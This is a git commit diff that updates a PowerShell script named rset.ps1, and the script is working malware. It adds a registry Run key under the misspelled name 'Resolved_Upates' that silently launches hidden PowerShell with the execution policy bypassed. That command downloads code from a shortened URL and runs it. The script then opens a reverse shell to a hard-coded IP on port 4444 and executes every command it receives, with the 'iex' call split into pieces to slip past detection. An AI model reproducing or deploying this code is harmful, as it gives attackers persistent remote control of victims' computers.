228fda66a86d0868dc0f73655df1d7331996e5e6
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 03:10:01 +0530

    Update rset.ps1

--- rset.ps1
+++ rset.ps1
@@ -1,17 +1,13 @@
 $command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/OjiMT | iex`""'
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
-$ipAddr = ([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).ToString()
 $h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
 $i = "134.209.113.62";$p = 4444
-$c = New-Object ($h) ($i, $p)
-$s = $c.GetStream()
-$b = 0..65535 | % { 0 }
-while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
-    $d = (New-Object ($a)).GetString($b, 0, $r)
-    $t = &('ie' + 'x') $d 2>&1 | Out-String
-    $t2 = "[$ipAddr]`n$t`nPS " + (pwd).Path + "> "
-    $m = [Text.Encoding]::ASCII.GetBytes($t2)
-    $s.Write($m, 0, $m.Length)
-    $s.Flush()
-}
-$c.Close()
+$c=New-Object ($h) ($i,$p);$s=$c.GetStream()
+$b=0..65535|%{0}
+while(($r=$s.Read($b,0,$b.Length)) -ne 0){
+$d=(New-Object ($a)).GetString($b,0,$r)
+$t=&('ie'+'x') $d 2>&1 | Out-String
+$t2=$t + ('PS ' + (pwd).Path + '> ')
+$m=[Text.Encoding]::ASCII.GetBytes($t2)
+$s.Write($m,0,$m.Length);$s.Flush()
+};$c.Close()
